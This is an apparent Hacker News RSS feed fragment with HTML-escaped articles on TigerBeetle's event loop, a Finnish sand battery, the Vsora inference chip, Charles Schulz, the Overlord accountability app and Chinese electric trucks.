    &lt;p&gt;In both this blog post and in TigerBeetle, we implemented a single-threaded event loop. Keeping I/O code single-threaded in userspace is beneficial (whether or not I/O processing is single-threaded in the kernel is not our concern). It√¢s the simplest code and best for workloads that are not embarrassingly parallel. It is also best for determinism, which is integral to the design of TigerBeetle because it enables us to do Deterministic Simulation Testing&lt;/p&gt;
    &lt;p&gt;But there are other valid architectures for other workloads.&lt;/p&gt;
    &lt;p&gt;For workloads that are embarrassingly parallel, like many web servers, you could instead use multiple threads where each thread has its own queue. In optimal conditions, this architecture has the highest I/O throughput possible.&lt;/p&gt;
    &lt;p&gt;But if each thread has its own queue, individual threads can become starved if an uneven amount of work is scheduled on one thread. In the case of dynamic amounts of work, the better architecture would be to have a single queue but multiple worker threads doing the work made available on the queue.&lt;/p&gt;
    &lt;p&gt;Hey, maybe we√¢ll split this out so you can use it too. It√¢s written in Zig so we can easily expose a C API. Any language with a C foreign function interface (i.e. every language) should work well with it. Keep an eye on our GitHub. :)&lt;/p&gt;
    &lt;p&gt;Additional resources:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46073817</guid><pubDate>Thu, 27 Nov 2025 22:41:06 +0000</pubDate></item><item><title>250MWh 'Sand Battery' to start construction in Finland</title><link>https://www.energy-storage.news/250mwh-sand-battery-to-start-construction-in-finland-for-both-heating-and-ancillary-services/</link><description>&lt;doc fingerprint="b76f0758cbd3b7b"&gt;
  &lt;main&gt;
    &lt;p&gt;Technology provider Polar Night Energy and utility Lahti Energia have partnered for a large-scale project using Polar‚Äôs ‚ÄòSand Battery‚Äô technology for the latter‚Äôs district heating network in V√§√§ksy, Finland.&lt;/p&gt;
    &lt;p&gt;The project will have a heating power of 2MW and a thermal energy storage (TES) capacity of 250MW, making it a 125-hour system and the largest sand-based TES project once complete.&lt;/p&gt;
    &lt;p&gt;It will supply heat to Lahti Energia‚Äôs V√§√§ksy district heating network but is also large enough to participate in Fingrid‚Äôs reserve and grid balancing markets.&lt;/p&gt;
    &lt;p&gt;Polar Night Energy‚Äôs technology works by heating a sand or a similar solid material using electricity, retaining that heat and then discharging that for industrial or heating use.&lt;/p&gt;
    &lt;head rend="h2"&gt;Try Premium for just $1&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Full premium access for the first month at only $1&lt;/item&gt;
      &lt;item&gt;Converts to an annual rate after 30 days unless cancelled&lt;/item&gt;
      &lt;item&gt;Cancel anytime during the trial period&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Premium Benefits&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Expert industry analysis and interviews&lt;/item&gt;
      &lt;item&gt;Digital access to PV Tech Power journal&lt;/item&gt;
      &lt;item&gt;Exclusive event discounts&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Or get the full Premium subscription right away&lt;/head&gt;
    &lt;head rend="h3"&gt;Or continue reading this article for free&lt;/head&gt;
    &lt;p&gt;The project will cut fossil-based emissions in the V√§√§ksy district heating network by around 60% each year, by reducing natural gas use bu 80% and also decreasing wood chip consumption.&lt;/p&gt;
    &lt;p&gt;It follows Polar Night Energy completing and putting a 1MW/100MWh Sand Battery TES project into commercial operations this summer, for another utility Loviisan L√§mp√∂. That project uses soapstone as its storage medium, a byproduct of ceramics production.&lt;/p&gt;
    &lt;p&gt;This latest project will use locally available natural sand, held in a container 14m high and 15m wide. Lahti Energia received a grant for the project from state body Business Finland.&lt;/p&gt;
    &lt;p&gt;Polar Night Energy will act as the main contractor for the construction project, with on-site work beginning in early 2026, and the Sand Battery will be completed in summer 2027.&lt;/p&gt;
    &lt;p&gt;‚ÄúWe want to offer our customers affordable district heating and make use of renewable energy in our heat production. The scale of this Sand Battery also enables us to participate in Fingrid‚Äôs reserve and grid balancing markets. As the share of weather-dependent energy grows in the grid, the Sand Battery will contribute to balancing electricity supply and demand‚Äù, says Jouni Haikarainen, CEO of Lahti Energia.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46073855</guid><pubDate>Thu, 27 Nov 2025 22:48:44 +0000</pubDate></item><item><title>Vsora Jotunn-8 5nm European inference chip</title><link>https://vsora.com/products/jotunn-8/</link><description>&lt;doc fingerprint="a495c47b155c4c8f"&gt;
  &lt;main&gt;
    &lt;p&gt;In modern data centers, success means deploying trained models with blistering speed, minimal cost, and effortless scalability. Designing and operating inference systems requires balancing key factors such as high throughput, low latency, optimized power consumption, and sustainable infrastructure. Achieving optimal performance while maintaining cost and energy efficiency is critical to meeting the growing demand for large-scale, real-time AI services across a variety of applications.&lt;/p&gt;
    &lt;p&gt;Unlock the full potential of your AI investments with our high-performance inference solutions. Engineered for speed, efficiency, and scalability, our platform ensures your AI models deliver maximum impact‚Äîat lower operational costs and with a commitment to sustainability. Whether you‚Äôre scaling up deployments or optimizing existing infrastructure, we provide the technology and expertise to help you stay competitive and drive business growth.&lt;/p&gt;
    &lt;p&gt;This is not just faster inference. It‚Äôs a new foundation for AI at scale.&lt;/p&gt;
    &lt;p&gt;In the world of AI data centers, speed, efficiency, and scale aren‚Äôt optional‚Äîthey‚Äôre everything. Jotunn8, our ultra-high-performance inference chip is built to deploy trained models with lightning-fast throughput, minimal cost, and maximum scalability. Designed around what matters most‚Äîperformance, cost-efficiency, and sustainability‚Äîthey deliver the power to run AI at scale, without compromise!&lt;/p&gt;
    &lt;p&gt;Why it matters: Critical for real-time applications like chatbots, fraud detection, and search.&lt;/p&gt;
    &lt;p&gt;Reasoning models, Generative AI and Agentic AI are increasingly being combined to build more capable and reliable systems. Generative AI provide flexibility and language fluency. Reasoning models provide rigor and correctness. Agentic frameworks provide autonomy and decision-making. The VSORA architecture enables smooth and easy integration of these algorithms, providing near-theory performance.&lt;/p&gt;
    &lt;p&gt;Why it matters: AI inference is often run at massive scale ‚Äì reducing cost per inference is essential for business viability.&lt;/p&gt;
    &lt;p&gt;Unmatched Performance at the Edge with Edge AI.&lt;/p&gt;
    &lt;p&gt;Fully programmable&lt;/p&gt;
    &lt;p&gt;Algorithm agnostic&lt;/p&gt;
    &lt;p&gt;Host processor agnostic&lt;/p&gt;
    &lt;p&gt;RISC-V core to offload &amp;amp; run AI completely on-chip&lt;/p&gt;
    &lt;p&gt;Tyr 4&lt;lb/&gt;fp8: 1600 Tflops&lt;lb/&gt;fp16: 400 Tflops&lt;/p&gt;
    &lt;p&gt;Tyr 2&lt;lb/&gt;fp8: 800 Tflops&lt;lb/&gt;fp16: 200 Tflops&lt;/p&gt;
    &lt;p&gt;Tyr 4&lt;lb/&gt;fp8/int8: 50 Tflops&lt;lb/&gt;fp16/int16: 25 Tflops&lt;lb/&gt;fp32/int32: 12 Tflops&lt;/p&gt;
    &lt;p&gt;Tyr 2&lt;lb/&gt;fp8/int8: 25 Tflops&lt;lb/&gt;fp16/int16: 12 Tflops&lt;lb/&gt;fp32/int32: 6 Tflops&lt;/p&gt;
    &lt;p&gt;Close to theory efficiency&lt;/p&gt;
    &lt;p&gt;Fully programmable&lt;/p&gt;
    &lt;p&gt;Algorithm agnostic&lt;/p&gt;
    &lt;p&gt;Host processor agnostic&lt;/p&gt;
    &lt;p&gt;RISC-V cores to offload host &lt;lb/&gt;&amp;amp; run AI completely on-chip.&lt;/p&gt;
    &lt;p&gt;fp8: 3200 Tflops&lt;lb/&gt;fp16: 800 Tflops &lt;/p&gt;
    &lt;p&gt;fp8/int8: 100 Tflops&lt;lb/&gt;fp16/int16: 50 Tflops&lt;lb/&gt;fp32/int32: 25 Tflops&lt;lb/&gt;Close to theory efficiency&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46074111</guid><pubDate>Thu, 27 Nov 2025 23:30:11 +0000</pubDate></item><item><title>Bird flu viruses are resistant to fever, making them a major threat to humans</title><link>https://medicalxpress.com/news/2025-11-bird-flu-viruses-resistant-fever.html</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46074286</guid><pubDate>Thu, 27 Nov 2025 23:57:57 +0000</pubDate></item><item><title>How Charles M Schulz created Charlie Brown and Snoopy (2024)</title><link>https://www.bbc.com/culture/article/20241205-how-charles-m-schulz-created-charlie-brown-and-snoopy</link><description>&lt;doc fingerprint="2e364174bde00afd"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;'You have to just draw something that you hope is funny': How Charles M Schulz created Charlie Brown and Snoopy&lt;/head&gt;
    &lt;p&gt;Charles M Schulz drew his beloved Peanuts strip for 50 years until his announcement on 14 December 1999 that ill health was forcing him to retire. In History looks at how an unassuming cartoonist built a billion-dollar empire out of the lives of a group of children, a dog and a bird.&lt;/p&gt;
    &lt;p&gt;Charles M Schulz's timeless creation Charlie Brown may have been as popular as any character in all of literature, but the cartoonist was modest about the scope of his miniature parables. In a 1977 BBC interview, he said: "I'm talking only about the minor everyday problems in life. Leo Tolstoy dealt with the major problems of the world. I'm only dealing with why we all have the feeling that people don't like us."&lt;/p&gt;
    &lt;p&gt;This did not mean that he felt as if he was dealing with trivial matters. He said: "I'm always very much offended when someone asks me, 'Do I ever do satire on the social condition?' Well, I do it almost every day. And they say, 'Well, do you ever do political things?' I say, 'I do things which are more important than politics. I'm dealing with love and hate and mistrust and fear and insecurity.'"&lt;/p&gt;
    &lt;p&gt;While Charlie Brown may have been the eternal failure, the universal feelings that Schulz channelled helped make Peanuts a global success. Born in 1922, Schulz drew every single Peanuts strip himself from 1950 until his death in February 2000. It was so popular that Nasa named two of the modules in its May 1969 Apollo 10 lunar mission after Charlie Brown and Snoopy. The strip was syndicated in more than 2,600 newspapers worldwide, and inspired films, music and countless items of merchandise.&lt;/p&gt;
    &lt;p&gt;Part of its success, according to the writer Umberto Eco, was that it worked on different levels. He wrote: "Peanuts charms both sophisticated adults and children with equal intensity, as if each reader found there something for himself, and it is always the same thing, to be enjoyed in two different keys. Peanuts is thus a little human comedy for the innocent reader and for the sophisticated."&lt;/p&gt;
    &lt;p&gt;Schulz's initial reason for focusing on children in the strip was strictly commercial. In 1990, he told the BBC: "I always hate to say it, but I drew little kids because this is what sold. I wanted to draw something, I didn't know what it was, but it just seemed as if whenever I drew children, these were the cartoons that editors seemed to like the best. And so, back in 1950, I mailed a batch of cartoons to New York City, to United Features Syndicate, and they said they liked them, and so ever since I've been drawing little kids."&lt;/p&gt;
    &lt;p&gt;IN HISTORY&lt;/p&gt;
    &lt;p&gt;In History is a series which uses the BBC's unique audio and video archive to explore historical events that still resonate today. Subscribe to the accompanying weekly newsletter.&lt;/p&gt;
    &lt;p&gt;Of Snoopy and Charlie Brown, he said: "I've always been a little bit intrigued by the fact that dogs apparently tolerate the actions of the children with whom they are playing. It's almost as if the dogs are smarter than the kids. I think also that the characters I have serve as a good outlet for any idea that I may come up with. I never think of an idea and then find that I have no way of using it. I can use any idea that I think of because I've got the right repertory company."&lt;/p&gt;
    &lt;p&gt;Schulz called upon some of his earliest experiences as a shy child to create the strip. As a teenager, he studied drawing by correspondence course because he was too reticent to attend art school in person. Speaking in 1977, he said: "I couldn't see myself sitting in a room where everyone else in the room could draw much better than I, and this way I was protected by drawing at home and simply mailing my drawings in and having them criticised. I wish I had a better education, but I think that my entire background made me well suited for what I do.&lt;/p&gt;
    &lt;p&gt;"If I could write better than I can, perhaps I would have tried to become a novelist, and I might have become a failure. If I could draw better than I can, I might have tried to become an illustrator or an artist and would have failed there, but my entire being seems to be just right for being a cartoonist."&lt;/p&gt;
    &lt;head rend="h2"&gt;Never give up&lt;/head&gt;
    &lt;p&gt;Peanuts remained remarkably consistent despite the relentless publishing schedule, and Schulz would not let the expectations of his millions of fans become a distraction. He said: "You have to kind of bend over the drawing board, shut the world out and just draw something that you hope is funny. Cartooning is still drawing funny pictures, whether they're just silly little things or rather meaningful political cartoons, but it's still drawing something funny, and that's all you should think about at that time ‚Äì keep kind of a light feeling.&lt;/p&gt;
    &lt;p&gt;"I suppose when a composer is composing well, the music is coming faster than he can think of it, and when I have a good idea I can hardly get the words down fast enough. I'm afraid that they will leave me before I get them down on the paper. Sometimes my hand will literally shake with excitement as I'm drawing it because I'm having a good time. Unfortunately, this does not happen every day."&lt;/p&gt;
    &lt;p&gt;More like this:&lt;/p&gt;
    &lt;p&gt;‚Ä¢ Julie Andrews on being 'teased' for Mary Poppins&lt;/p&gt;
    &lt;p&gt;Despite his modesty, Schulz insisted he was always confident that Peanuts would be a hit. He said: "I mean, when you sign up to play at Wimbledon, you expect to win. Obviously, there are a lot of things that I didn't anticipate, like Snoopy's going to the Moon and things like that, but I always had hopes it would become big."&lt;/p&gt;
    &lt;p&gt;Schulz generally worked five weeks in advance. On 14 December 1999, fans were dismayed to learn that he would be hanging up his pen because he had cancer. He said that his cartoon for 3 January 2000 would be the final daily release. It would be followed on 13 February with the final strip for a Sunday newspaper. He died one day before that last strip ran.&lt;/p&gt;
    &lt;p&gt;In it, Schulz wrote: "I have been grateful over the years for the loyalty of our editors and the wonderful support and love expressed to me by fans of the comic strip. Charlie Brown, Snoopy, Linus, Lucy... how can I ever forget them..."&lt;/p&gt;
    &lt;p&gt;Back in 1977, Schulz insisted that the cartoonist's role was mostly to point out problems rather than trying to solve them, but there was one lesson that people could take from his work. He said: "I suppose one of the solutions is, as Charlie Brown, just to keep on trying. He never gives up. And if anybody should give up, he should."&lt;/p&gt;
    &lt;p&gt;--&lt;/p&gt;
    &lt;p&gt;For more stories and never-before-published radio scripts to your inbox, sign up to the In History newsletter, while The Essential List delivers a handpicked selection of features and insights twice a week.&lt;/p&gt;
    &lt;p&gt;For more Culture stories from the BBC, follow us on Facebook, X and Instagram.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46074362</guid><pubDate>Fri, 28 Nov 2025 00:10:38 +0000</pubDate></item><item><title>Overlord: AI accountability that watches over you</title><link>https://overlord.app/</link><description>&lt;doc fingerprint="71f98f7e052f67db"&gt;
  &lt;main&gt;
    &lt;head rend="h3"&gt;Strict Screen Time&lt;/head&gt;
    &lt;p&gt;Block distracting apps and websites with the most powerful screen time controls available.&lt;/p&gt;
    &lt;head rend="h3"&gt;Wake-up Call&lt;/head&gt;
    &lt;p&gt;Get out of bed on time every morning with calls and escalating consequences.&lt;/p&gt;
    &lt;head rend="h3"&gt;Workout Consistency&lt;/head&gt;
    &lt;p&gt;Track your workouts through app integrations and maintain your fitness streak.&lt;/p&gt;
    &lt;head rend="h3"&gt;Bedtime Enforcement&lt;/head&gt;
    &lt;p&gt;Wind down and get to sleep on time every night with progressive device restrictions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Overlord Integrations&lt;/head&gt;
    &lt;p&gt;Integrate apps with Overlord. The more data, the more accountability.&lt;/p&gt;
    &lt;head rend="h3"&gt;Apple Health&lt;/head&gt;
    &lt;head rend="h3"&gt;Sleep Cycle&lt;/head&gt;
    &lt;head rend="h3"&gt;Withings&lt;/head&gt;
    &lt;head rend="h3"&gt;Screen Time&lt;/head&gt;
    &lt;head rend="h3"&gt;Mac Activity&lt;/head&gt;
    &lt;head rend="h3"&gt;Location&lt;/head&gt;
    &lt;head rend="h3"&gt;IFTTT&lt;/head&gt;
    &lt;head rend="h3"&gt;MCP&lt;/head&gt;
    &lt;head rend="h2"&gt;Overlord Controls You&lt;/head&gt;
    &lt;p&gt;There are many ways Overlord can force you to add structure to your life.&lt;/p&gt;
    &lt;head rend="h2"&gt;iOS Control&lt;/head&gt;
    &lt;p&gt;Overlord can give you unblocks, stop you from disabling Screen Time permissions, and lock away your Screen Time passcode.&lt;/p&gt;
    &lt;head rend="h3"&gt;Create Goals via Chat&lt;/head&gt;
    &lt;head rend="h3"&gt;Improve Goals via Chat&lt;/head&gt;
    &lt;head rend="h3"&gt;Custom Instructions&lt;/head&gt;
    &lt;head rend="h3"&gt;Password Locker (iOS)&lt;/head&gt;
    &lt;head rend="h3"&gt;Long-Term Memory&lt;/head&gt;
    &lt;head rend="h3"&gt;Quick Lock-ins&lt;/head&gt;
    &lt;head rend="h2"&gt;Overlord on Mac&lt;/head&gt;
    &lt;p&gt;Overlord knows exactly what you're doing on your Mac. Configure words to trigger a message to Overlord, blocks, and send in pomodoros&lt;/p&gt;
    &lt;p&gt;Tracks Everything&lt;/p&gt;
    &lt;p&gt;Every ten seconds, Overlord tracks all applications, websites, and website titles that you have open.&lt;/p&gt;
    &lt;p&gt;Flexible Blocking&lt;/p&gt;
    &lt;p&gt;Overlord manages your blocks, providing the leniency other blockers lack.&lt;/p&gt;
    &lt;p&gt;Pomodoro&lt;/p&gt;
    &lt;p&gt;Send Pomodoro timers to Overlord, ensuring you stay productive during work sessions.&lt;/p&gt;
    &lt;p&gt;Trigger Words&lt;/p&gt;
    &lt;p&gt;If detected, Overlord can block sites, call you, charge penalties, and more.&lt;/p&gt;
    &lt;head rend="h2"&gt;Frequently Asked Questions&lt;/head&gt;
    &lt;p&gt;Overlord is an AI accountability partner. It's fairly hardcore, and no-bullshit, but you can tune it to be nice if you want. It's not meant to be there for emotional support, but moreso to apply hard, but flexible, guardrails to your life. I like this thought experiment: Imagine if a firm-but-fair friend, who cares about you, is awake 24/7, and watching a monitor with where you are, what you're spending money on, what you're browsing on your computer, etc. They can call you, text you, text your friends, take money off you, etc. How would this make you live a better life?&lt;/p&gt;
    &lt;p&gt;Overlord is designed to be as strict as you want it to be. Typical users let the Overlord know when they're prone to cheating (ie, early in the morning, before the gym, etc), so Overlord will be stricter around those times.&lt;/p&gt;
    &lt;p&gt;Overlord is designed to be like a human. If you want it to be super strict, just let it know. If you want it to be lenient, that's great too!&lt;/p&gt;
    &lt;p&gt;Overlord is on iOS, Android, and Mac. The Mac app is currently the iPad app, but we are working on a native Mac app. The Mac integration is a separate app, and is a native Mac app.&lt;/p&gt;
    &lt;p&gt;You can customise the personality, and rules for each action. Overlord also learns as you message it.&lt;/p&gt;
    &lt;p&gt;Overlord is designed to be like a human. Ie, in these instances, it will try to balance strictness with fairness.&lt;/p&gt;
    &lt;p&gt;Goals are assessed every night at midnight in your local timezone. At this point, Overlord determines whether you've successfully completed or failed the goal based on the criteria and integrations you've set up.&lt;/p&gt;
    &lt;p&gt;Our iOS integration works with Apple's Screen Time. By default, apps you want to control can be blocked. Overlord then acts as the gatekeeper, granting temporary unblocks or exceptions based on your predefined rules, completed tasks, or specific requests you make through the Overlord chat.&lt;/p&gt;
    &lt;p&gt;First, download the Overlord app on your iOS or Android device. Inside the app's settings or integrations section, you'll find an option for the Mac utility. You can input your email there, and we'll send you a direct download link for the Mac application.&lt;/p&gt;
    &lt;p&gt;No, all activity data it collects for monitoring purposes is stored only locally on your Mac. It only communicates with the Overlord app to report on goal completion or trigger actions based on your rules, not to upload raw activity logs to the cloud.&lt;/p&gt;
    &lt;p&gt;Absolutely! We want you to succeed. My (Josh) personal phone number is available within the app. Please feel free to call or FaceTime me directly if you'd like guidance, ideas, or assistance in setting up your goals to be as effective as possible.&lt;/p&gt;
    &lt;p&gt;For probably half the population, self-control is probably their #1 issue. This previously wasn't a solvable issue (some things helped, like screen blockers, and personal trainers), but in the age of AI, I believe that self-control - at least on a minute-by-minute, hour-by-hour basis - is now in the realm of a solvable engineering problem.&lt;/p&gt;
    &lt;head rend="h2"&gt;Self-Control is Solved&lt;/head&gt;
    &lt;p&gt;In the AI age, self-control is a solved problem. Download Overlord now.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46074729</guid><pubDate>Fri, 28 Nov 2025 01:22:13 +0000</pubDate></item><item><title>China's BEV Trucks and the End of Diesel's Dominance</title><link>https://cleantechnica.com/2025/11/26/chinas-bev-trucks-and-the-end-of-diesels-dominance/</link><description>&lt;doc fingerprint="aafc0042e1d89de8"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;China‚Äôs BEV Trucks and the End of Diesel‚Äôs Dominance&lt;/head&gt;
    &lt;p&gt;Support CleanTechnica's work through a Substack subscription or on Stripe.&lt;/p&gt;
    &lt;p&gt;Cheap Chinese battery electric heavy trucks are no longer a rumor. They are real machines with real price tags that are so low that they force a reassessment of what the global freight industry is willing to pay for electrification. Standing in a commercial vehicle hall in Wuhan and seeing a 400 kWh or 600 kWh truck priced between ‚Ç¨58,000 and ‚Ç¨85,000, as my European freight trucking electrification contact Johnny Nijenhuis recently did, changes the frame of the entire conversation. These are not diesel frames with a battery box welded underneath. They are purpose built electric trucks built around LFP packs, integrated e-axles and the simplified chassis architecture that becomes possible when the engine bay, gearbox, diesel tank, emissions controls and half of the mechanical complexity of a truck disappear. Anyone who has worked with heavy vehicles knows the cost structure of diesel powertrains. Removing that entire system while building at very large scale produces numbers that do not match Western experience.&lt;/p&gt;
    &lt;p&gt;China‚Äôs low price electric trucks do not arrive as finished products for Europe or North America. They need work. Western short haul freight fleets expect certain features that Chinese domestic buyers usually skip. Tires need to carry E-mark or FMVSS certification. Electronic stability controls must meet UNECE R13 or FMVSS 121. Cab structures need to meet R29 or similar requirements. Crash protection for battery packs needs to satisfy R100 or FMVSS 305. European drivers expect better seats, quieter cabs and stronger HVAC. Even in short haul work, fleets expect well understood advanced driver assistance (ADAS) features to handle traffic and depot work. However, inexpensive Chinese leaf springs are just fine for short haul trucking given the serious upgrade to driver comfort and truck performance of battery electric drivetrains.&lt;/p&gt;
    &lt;p&gt;When these adjustments are added into the bill of materials and spread across a production run, the upgrades land in the ‚Ç¨20,000 to ‚Ç¨40,000 range for short haul duty, per my rough estimate. That moves the landed price up to roughly ‚Ç¨80,000 to ‚Ç¨120,000. The comparison with Western OEM offerings is stark because Western battery electric trucks today often start near ‚Ç¨250,000 and can move far higher once options and charging hardware are included. A short haul operator looking at the difference between a ‚Ç¨100,000 truck and a ‚Ç¨300,000 truck will ask which one meets the actual duty cycle. For operators with depot charging and predictable delivery routes, the cheaper truck is credible in a way that few expected even three years ago.&lt;/p&gt;
    &lt;p&gt;The long haul story is different. European and North American long haul operators require far more from a truck than a Chinese domestic short range tractor offers. Axle loads need to support 40 to 44 ton gross combined weight. Suspension needs to manage high speed stability for many hours a day on roads built for 80 to 100 km/h cruising. Cab structures must handle fatigue and cross winds on long corridors. Drivers spend nights sleeping in the cab and expect western comfort standards. Trailer interfaces require specific electrical and pneumatic systems that have to meet long established norms. Battery safety systems need to be built for high speed impacts and rollover events. All of that requires a larger budget. The gap between a domestic Chinese tractor and a European or North American long haul tractor is roughly ‚Ç¨80,000 to ‚Ç¨120,000 once all mechanical, safety and comfort systems are brought to the required levels per my estimate. That does not erase the cost advantage, because even a ‚Ç¨180,000 Chinese based long haul electric truck is cheaper than many Western models, but it does shift the choice from simple purchase price to service expectations and lifetime durability.&lt;/p&gt;
    &lt;p&gt;Most freight is not long haul. French and German economic councils have both looked at freight movements through national data and concluded that the majority of truck trips and ton kilometers occur in short haul service. This includes urban deliveries, regional distribution, logistics shuttles between depots and ports, construction supply and waste collection. These trips are usually under 250 km, begin and end at the same depot and involve repeated stop-start movement where electric drivetrains perform well. The idea that the heavy trucking problem is a long haul problem has shaped Western investment priorities for a decade, but national economic councils in Europe now argue that solving short haul electrification first delivers most of the benefit. The fact that low cost Chinese battery electric trucks map almost perfectly onto these duty cycles suggests that they will find receptive markets once import pathways are established.&lt;/p&gt;
    &lt;p&gt;China‚Äôs shift away from diesel in the heavy truck segment is dramatic. The country sold more than 900,000 heavy trucks in 2024. Diesel‚Äôs share fell to about 57% that year. Natural gas trucks rose to around 29%. Battery electric trucks reached 13%. Early 2025 data points to battery electric share rising again to about 22% of new heavy truck sales, with diesel falling close to the 50% mark. These shifts are large movements inside a very conservative sector. Natural gas trucks saw a rapid rise between 2022 and 2024 as operators chased lower fuel prices and simpler emissions compliance, but the price war in battery electric trucks has made electric freight attractive for many of the same operators. Gas trucks still fill some niches, but the pattern suggests that they may face the same pressure that diesel trucks face. Electric trucks with low running costs and high cycle life begin to look compelling to operators once the purchase price falls into a familiar range.&lt;/p&gt;
    &lt;p&gt;Western OEMs entered China with hopes of capturing a share of the largest truck market in the world, but the results have been mixed. Joint ventures like Foton Daimler once offered a bridge into domestic heavy trucking, yet the rapid rise of low cost local manufacturers in both diesel and electric segments has eroded that position. Western models arrived with higher prices and platforms optimized for different regulations and freight conditions. As domestic OEMs expanded capacity and cut costs, the market shifted toward local brands in every drivetrain category. The impact is clear. Western firms now face reduced market share, weaker margins and strategic uncertainty about long term participation in China‚Äôs truck sector.&lt;/p&gt;
    &lt;p&gt;Underlying these drivetrain transitions is a heavy truck market that is smaller and more complicated than it was five years ago. The peak in 2020, with roughly 1.6 million heavy trucks sold, was not a normal year. It was driven by a large regulatory pre-buy that pulled forward sales before tighter emissions rules arrived. The freight economy was also stronger at that time and the construction sector had not yet entered its recent slowdown. As those drivers faded, the market returned to what looks like a long term equilibrium between 800,000 and one million trucks per year. Several confounding factors overlap in this period. Freight volumes shifted. Rail took a larger share of bulk transport as China achieved what North America and Europe have only talked about, mode shifting. Replacement cycles grew longer. Real estate and construction slowed. Diesel‚Äôs loss of share is partly driven by these economic factors and partly driven by the arrival of cheaper alternatives. It is difficult to separate the exact contribution of each. The net result is a natural market size that is much lower than the 2020 peak and a much more competitive fight inside the remaining market.&lt;/p&gt;
    &lt;p&gt;Hydrogen heavy truck sales in China show a pattern of stalling growth followed by early signs of decline in 2025. Registration data and industry reports indicate that fuel cell heavy trucks were less than 1% of the heavy truck market in 2024, amounting to low single digit thousands of vehicles, and most of these were tied to provincial demonstration subsidies rather than broad fleet adoption. In the first half of 2025 the number of registered hydrogen trucks rose slightly on paper, but analysts inside China noted that real world operation rates were low and that several local programs were winding down as subsidies tightened. At the same time battery electric heavy trucks climbed from 13% of new sales in 2024 to 22% in early 2025. Hydrogen heavy trucks are losing ground inside a market that is moving quickly toward lower cost electric models, and operators are stepping away from fuel cell platforms as more credible electric options appear. I didn‚Äôt bother to include hydrogen on the truck statistics chart as it‚Äôs a rounding error and not increasing.&lt;/p&gt;
    &lt;p&gt;One indicator that connects these pieces is diesel consumption. China‚Äôs diesel use dropped by about 11% year over year at one point in 2024, which is not a small shift in a country with heavy commercial transport. Part of the drop was due to economic slowing in trucking dominant sectors, but the rise of LNG trucks and electric trucks also contributed. When a truck that once burned diesel every day is replaced by a gas or battery electric truck, national fuel consumption reacts quickly. The fuel market sees these changes earlier than the headline truck sales numbers because thousands of trucks operating every day create a measurable signal in fuel demand. The data is consistent with a freight system that is changing in composition and technology at a pace that would have seemed unlikely a few years earlier.&lt;/p&gt;
    &lt;p&gt;Western operators have to look at this landscape with practical questions in mind. The leading electric bus manufacturer in Europe is Chinese because it built functional electric buses at lower prices before Western firms did. There is no reason the same pattern will not repeat in trucks. Once the cost of a short haul electric truck falls near the cost of a diesel truck, operators will start to buy them. If the imported option is much cheaper than the domestic option, early fleets will run the numbers and make decisions based on cash flow and reliability. Western OEMs face challenges in this environment because their legacy designs and cost structures are not tuned for the kind of price war that emerged in China. They need to match cost while preserving safety and service expectations, which is difficult while shifting from a century of diesel design to a new electric architecture.&lt;/p&gt;
    &lt;p&gt;Western OEMs entered the electric truck market with the platforms they already understood. Most began by taking a diesel tractor frame, removing the engine and gearbox and adding batteries, motors and the associated power electronics. This approach kept production lines moving and reduced near term engineering risk, but it produced electric trucks that carried the compromises of diesel architecture. Battery boxes hung from ladder frames, wiring loops wound through spaces never designed for high voltage systems and weight distribution was optimized for a drivetrain that no longer existed. Several OEMs even explored hydrogen drivetrains inside the same basic frames, which locked in the limitations of a platform built around an internal combustion engine. The results were heavier trucks with less space for batteries, higher costs and lower overall efficiency.&lt;/p&gt;
    &lt;p&gt;The shift toward purpose built electric tractors is only now underway among the major Western OEMs. Volvo‚Äôs FH Electric and FM Electric, Daimler‚Äôs eActros 300 and 600, Scania‚Äôs new battery electric regional tractor and MAN‚Äôs eTruck all represent clean sheet or near clean sheet electric designs with integrated drivetrains and optimized battery packaging. These models move Western OEMs closer to the design philosophy that Chinese manufacturers adopted earlier, where the entire platform is built around the electric driveline from the start.&lt;/p&gt;
    &lt;p&gt;China has moved faster toward battery electric heavy trucks than any other major market. It built supply chains for motors, inverters, LFP cells, structural packs and integrated e-axles. It created standard designs and cut costs through volume. It encouraged competition. It is now exporting electric trucks into Asia, Latin America and Africa. Europe and North America are watching this unfold while debating the right charging standards and duty cycle models. The arrival of low cost electric trucks from China raises uncomfortable questions for Western OEMs and policymakers, but it also provides an opportunity. If freight electrification can happen at one third the expected cost, then the pace of decarbonization can be much faster. The challenge is deciding how to integrate or respond to the cost structure that China has already built.&lt;/p&gt;
    &lt;p&gt;The story of heavy trucking is no longer a slow migration from diesel to a distant alternative. The transition is already underway at scale inside the world‚Äôs largest heavy truck market. It does not look like the long haul hydrogen scenario that dominated Western modelling for the last decade. It looks like battery electric trucks built cheaply and deployed quickly into short haul service. The economic logic is straightforward. The operational fit is strong. The supply chain is built. The lesson for Western operators and policymakers is that the cost curve has shifted. The decisions that made sense even in 2024 do not match the realities of 2025. The market is moving toward electric freight because it is becoming cheaper than diesel across the majority of real world duty cycles. From the short haul electric trucks will come the new generation of long haul trucks, as night follows day. The arrival of low cost battery trucks from China marks the beginning of a new phase in freight decarbonization.&lt;/p&gt;
    &lt;p&gt;Sign up for CleanTechnica's Weekly Substack for Zach and Scott's in-depth analyses and high level summaries, sign up for our daily newsletter, and follow us on Google News!&lt;/p&gt;
